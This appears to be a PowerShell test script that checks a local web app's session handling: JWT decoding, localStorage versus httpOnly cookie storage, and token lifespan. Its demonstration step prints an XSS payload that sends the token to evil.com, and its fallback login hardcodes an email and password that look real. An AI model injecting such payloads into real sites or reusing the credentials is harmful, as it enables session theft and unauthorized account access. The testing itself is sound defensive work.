# Session Management Security Test
# Tests JWT token storage and expiration vulnerabilities

$API_URL = "http://localhost:1337"

Write-Host "`n========================================" -ForegroundColor Cyan
Write-Host "Session Management Security Test" -ForegroundColor Cyan
Write-Host "========================================`n" -ForegroundColor Cyan

# Test credentials
$testEmail = "sessiontest_$(Get-Random)@test.com"
$testPassword = "TestPass123!"

# Step 1: Register a test user
Write-Host "[1] Registering test user..." -ForegroundColor Yellow

$registerBody = @{
    username = "sessiontest_$(Get-Random)"
    email = $testEmail
    password = $testPassword
} | ConvertTo-Json

try {
    $registerResponse = Invoke-RestMethod -Uri "$API_URL/api/auth/local/register" -Method POST -Body $registerBody -ContentType "application/json"
    $token = $registerResponse.jwt
    Write-Host "    [+] User registered successfully" -ForegroundColor Green
    Write-Host "    [+] JWT Token received" -ForegroundColor Green
} catch {
    # If registration fails, try login with existing test account
    Write-Host "    [!] Registration failed, trying login..." -ForegroundColor Yellow
    $loginBody = @{
        identifier = "hadinajem123@gmail.com"
        password = "Hadinajem123!"
    } | ConvertTo-Json
    
    try {
        $loginResponse = Invoke-RestMethod -Uri "$API_URL/api/auth/local" -Method POST -Body $loginBody -ContentType "application/json"
        $token = $loginResponse.jwt
        Write-Host "    [+] Login successful" -ForegroundColor Green
    } catch {
        Write-Host "    [-] Could not authenticate. Make sure the API is running." -ForegroundColor Red
        exit 1
    }
}

# Step 2: Analyze JWT Token Structure
Write-Host "`n[2] Analyzing JWT Token Structure..." -ForegroundColor Yellow

# Decode JWT (Base64)
$tokenParts = $token.Split('.')
$header = $tokenParts[0]
$payload = $tokenParts[1]

# Add padding if needed for Base64 decoding
$payloadPadded = $payload
while ($payloadPadded.Length % 4 -ne 0) {
    $payloadPadded += "="
}

# Replace URL-safe characters
$payloadPadded = $payloadPadded.Replace('-', '+').Replace('_', '/')

try {
    $decodedPayload = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($payloadPadded))
    $payloadJson = $decodedPayload | ConvertFrom-Json
    
    Write-Host "`n    JWT Payload Contents:" -ForegroundColor Cyan
    Write-Host "    ----------------------"
    Write-Host "    User ID: $($payloadJson.id)"
    Write-Host "    Issued At (iat): $($payloadJson.iat)"
    Write-Host "    Expires At (exp): $($payloadJson.exp)"
    
    # Convert timestamps to readable dates
    $issuedDate = (Get-Date "1970-01-01").AddSeconds($payloadJson.iat)
    $expiresDate = (Get-Date "1970-01-01").AddSeconds($payloadJson.exp)
    $tokenLifespan = $expiresDate - $issuedDate
    
    Write-Host "`n    Readable Dates:" -ForegroundColor Cyan
    Write-Host "    Issued: $issuedDate"
    Write-Host "    Expires: $expiresDate"
    Write-Host "    Token Lifespan: $($tokenLifespan.Days) days" -ForegroundColor Yellow
    
} catch {
    Write-Host "    [-] Could not decode JWT payload" -ForegroundColor Red
}

# Step 3: Test Token Storage Vulnerability (Client-Side Issue)
Write-Host "`n[3] Token Storage Analysis..." -ForegroundColor Yellow
Write-Host "    =========================" -ForegroundColor Cyan

# Check frontend app.js for localStorage usage
$frontendPath = "c:\projects\websec\frontend\app.js"
$frontendCode = Get-Content $frontendPath -Raw

$usesLocalStorage = $frontendCode -match "localStorage\.setItem\('token'"
$usesCookies = $frontendCode -match "setSecureCookie|credentials:\s*'include'"

if ($usesLocalStorage) {
    $storageAnalysis = @{
        tokenInLocalStorage = $true
        tokenInSessionStorage = $false
        tokenInHttpOnlyCookie = $false
        tokenExpiresAt = $expiresDate.ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
    }
    Write-Host "`n    Frontend stores JWT in: localStorage" -ForegroundColor Red
    Write-Host "    [VULNERABLE] localStorage is accessible via JavaScript" -ForegroundColor Red
    Write-Host "    [VULNERABLE] Any XSS attack can steal the token" -ForegroundColor Red
} elseif ($usesCookies) {
    $storageAnalysis = @{
        tokenInLocalStorage = $false
        tokenInSessionStorage = $false
        tokenInHttpOnlyCookie = $true
        tokenExpiresAt = $expiresDate.ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
    }
    Write-Host "`n    Frontend uses: Secure Cookie-based session" -ForegroundColor Green
    Write-Host "    [FIXED] Token is NOT stored in localStorage" -ForegroundColor Green
    Write-Host "    [FIXED] Session managed via httpOnly cookies" -ForegroundColor Green
    Write-Host "    [FIXED] JavaScript cannot access httpOnly cookies (XSS protected)" -ForegroundColor Green
} else {
    $storageAnalysis = @{
        tokenInLocalStorage = $false
        tokenInSessionStorage = $false
        tokenInHttpOnlyCookie = $false
        tokenExpiresAt = $expiresDate.ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
    }
    Write-Host "`n    Storage method: Unknown" -ForegroundColor Yellow
}

# Step 4: Demonstrate the vulnerability (or show it's fixed)
Write-Host "`n[4] Vulnerability Demonstration..." -ForegroundColor Yellow
Write-Host "    ==============================" -ForegroundColor Cyan

if ($usesLocalStorage) {
    Write-Host "`n    If an attacker injects this JavaScript:" -ForegroundColor Yellow
    Write-Host '    <script>fetch("https://evil.com?token="+localStorage.getItem("token"))</script>' -ForegroundColor Red
    Write-Host "`n    The attacker would receive:" -ForegroundColor Yellow
    Write-Host "    Token: $($token.Substring(0, 50))..." -ForegroundColor Red
} else {
    Write-Host "`n    If an attacker injects this JavaScript:" -ForegroundColor Yellow
    Write-Host '    <script>fetch("https://evil.com?token="+localStorage.getItem("token"))</script>' -ForegroundColor Cyan
    Write-Host "`n    The attacker would receive:" -ForegroundColor Yellow
    Write-Host "    Token: null (token is not in localStorage!)" -ForegroundColor Green
    Write-Host "`n    [PROTECTED] XSS attacks cannot steal the session token" -ForegroundColor Green
}

# Step 5: Test token expiration issue
Write-Host "`n[5] Token Expiration Analysis..." -ForegroundColor Yellow
Write-Host "    ============================" -ForegroundColor Cyan

$tokenMinutes = $tokenLifespan.TotalMinutes
if ($tokenLifespan.Days -ge 1) {
    Write-Host "`n    [VULNERABLE] Token expires in $($tokenLifespan.Days) days" -ForegroundColor Red
    Write-Host "    [ISSUE] Long-lived tokens increase the window for token theft" -ForegroundColor Red
    Write-Host "    [ISSUE] No refresh token rotation implemented" -ForegroundColor Red
} elseif ($tokenMinutes -le 60) {
    Write-Host "`n    [FIXED] Token expiration is secure: $([math]::Round($tokenMinutes)) minutes" -ForegroundColor Green
    Write-Host "    [OK] Short-lived tokens minimize the window for token theft" -ForegroundColor Green
} else {
    Write-Host "`n    [OK] Token expiration is reasonable: $([math]::Round($tokenMinutes)) minutes" -ForegroundColor Green
}

# Step 6: Verify token works
Write-Host "`n[6] Verifying Token Functionality..." -ForegroundColor Yellow

$headers = @{
    "Authorization" = "Bearer $token"
}

try {
    $meResponse = Invoke-RestMethod -Uri "$API_URL/api/users/me" -Method GET -Headers $headers
    Write-Host "    [+] Token is valid and working" -ForegroundColor Green
    Write-Host "    [+] Authenticated as: $($meResponse.email)" -ForegroundColor Green
} catch {
    Write-Host "    [-] Token validation failed" -ForegroundColor Red
}

# Summary
Write-Host "`n========================================" -ForegroundColor Cyan
Write-Host "TEST SUMMARY" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan

# Build dynamic results based on actual checks
$vulnerabilities = @()
$fixes = @()

if ($usesLocalStorage) {
    $vulnerabilities += "JWT stored in localStorage (XSS vulnerable)"
    $vulnerabilities += "No httpOnly cookie protection"
} else {
    $fixes += "Token NOT stored in localStorage (XSS protected)"
    $fixes += "Using httpOnly cookie-based sessions"
}

if ($tokenMinutes -gt 60) {
    $vulnerabilities += "Token lifespan: $($tokenLifespan.Days) days (too long)"
} else {
    $fixes += "Token expiration: $([math]::Round($tokenMinutes)) minutes (secure)"
}

$results = @{
    jwtPayload = @{
        id = $payloadJson.id
        iat = $payloadJson.iat
        exp = $payloadJson.exp
    }
    tokenStorage = $storageAnalysis
    tokenExpirationMinutes = [math]::Round($tokenMinutes)
}

if ($vulnerabilities.Count -gt 0) {
    $results.vulnerabilities = $vulnerabilities
}
if ($fixes.Count -gt 0) {
    $results.securityFixes = $fixes
}

Write-Host "`nResults JSON:" -ForegroundColor Yellow
$results | ConvertTo-Json -Depth 3

if ($vulnerabilities.Count -eq 0) {
    Write-Host "`n[+] SESSION MANAGEMENT SECURITY: ALL FIXES APPLIED" -ForegroundColor Green
} else {
    Write-Host "`n[!] SESSION MANAGEMENT VULNERABILITIES FOUND: $($vulnerabilities.Count)" -ForegroundColor Red
}
Write-Host "========================================`n" -ForegroundColor Cyan
